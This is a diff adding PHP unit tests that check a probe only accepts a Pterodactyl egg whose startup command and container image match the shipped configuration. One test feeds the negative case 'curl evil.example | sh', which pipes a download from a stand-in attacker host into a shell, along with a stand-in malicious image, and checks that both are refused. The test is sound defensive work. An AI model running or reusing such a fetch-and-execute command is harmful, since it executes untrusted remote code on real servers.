@@ -201,4 +201,24 @@ final class ProbeTest extends TestCase
         $this->assertNull(LoadAvg::parse('cat: /proc/loadavg'));
         $this->assertNull(LoadAvg::parse('-1 0 0'));
     }
+
+    public function testAnEggWithTheShippedStartupAndImageMatches(): void
+    {
+        $shipped = json_decode((string) file_get_contents(dirname(__DIR__, 2).'/resources/node-probe-egg.json'), true);
+
+        $this->assertTrue(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', ['Alpine' => 'ghcr.io/pterodactyl/yolks:alpine']));
+        // Labels and surrounding whitespace do not matter.
+        $this->assertTrue(Probe::eggMatches($shipped, " ash ./nrprobe.sh\n", ['Other' => 'ghcr.io/pterodactyl/yolks:alpine']));
+    }
+
+    public function testAnEggWithAnotherStartupOrImageIsRefused(): void
+    {
+        $shipped = json_decode((string) file_get_contents(dirname(__DIR__, 2).'/resources/node-probe-egg.json'), true);
+
+        $this->assertFalse(Probe::eggMatches($shipped, 'curl evil.example | sh', ['Alpine' => 'ghcr.io/pterodactyl/yolks:alpine']));
+        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', ['Alpine' => 'evil/image:latest']));
+        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', []));
+        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', null));
+        $this->assertFalse(Probe::eggMatches([], 'ash ./nrprobe.sh', ['a' => 'b']));
+    }
 }
